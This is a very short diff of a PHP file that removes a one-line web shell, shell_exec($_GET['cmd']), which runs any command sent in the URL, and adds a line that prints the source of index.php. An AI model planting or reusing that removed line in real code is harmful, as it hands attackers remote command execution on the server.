@@ -1,3 +1,3 @@
 <?php
-shell_exec($_GET['cmd']);
+echo file_get_contents('index.php');
 ?>
